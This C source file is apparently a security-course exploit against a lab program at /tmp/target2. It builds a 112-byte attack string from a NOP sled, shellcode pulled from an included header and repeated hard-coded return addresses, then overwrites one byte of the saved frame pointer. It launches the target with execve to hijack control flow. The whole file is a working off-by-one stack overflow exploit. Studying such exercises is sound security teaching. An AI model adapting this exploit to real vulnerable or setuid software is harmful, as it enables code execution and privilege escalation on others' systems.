#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

#define NOP         0x90                // NOP instruction
#define ATTACK_SIZE 112                 // Size of the attack_string
#define RET_ADDR    0xbffffd60          // Address of inside attack_string

int main(void)
{
    char *args[3];
    char *env[1];

    int i;                              // Loop counter
    char * attack_string;               // The attack_string, in case it still is not obvious
    char * char_ptr;                    // Pointer for traversing attack_string 1 byte at a time
    long *addr_ptr;                     // Pointer for traversing attack_string 4 bytes at a time

    // Allocate memory for the attack string
    attack_string = malloc(sizeof(char) * ATTACK_SIZE);

    // 1. Fill attack_string with return address
    addr_ptr = (long *) attack_string;
    for(i = 0; i < ATTACK_SIZE; i += 4) {
        *(addr_ptr++) = RET_ADDR;
    }

    // 2. Fill first half of attack_string with NOP
    for(i = 0; i < ATTACK_SIZE / 2; i++) {
        attack_string[i] = NOP;
    }

    // 3. Copy shellcode to the center of attack_string
    char_ptr = attack_string + ((ATTACK_SIZE / 2) - (strlen(shellcode) / 2));
    for(i = 0; i < strlen(shellcode); i++) {
        *(char_ptr++) = shellcode[i];
    }

    // 4. Set the second to last byte of attack_string to modify sebp
    attack_string[ATTACK_SIZE - 2] = '\xb2';

    // 5. Add a NUL character to the end of the attack_string
    attack_string[ATTACK_SIZE - 1] = '\0';

    args[0] = TARGET;
    args[1] = attack_string;
    args[2] = NULL;

    env[0] = NULL;

    if(0 > execve(TARGET, args, env)) {
        fprintf(stderr, "execve failed.\n");
    }

    return 0;
}
